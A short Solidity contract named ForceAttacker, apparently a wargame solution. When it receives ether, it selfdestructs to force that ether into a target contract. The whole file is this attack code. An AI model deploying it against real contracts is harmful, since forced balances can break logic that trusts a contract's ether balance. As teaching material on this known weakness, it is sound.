// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract ForceAttacker {
  address payable targetAddress;

  constructor(address payable target) {
    targetAddress = target;
  }

  receive() external payable {
    selfdestruct(targetAddress);
  }
}
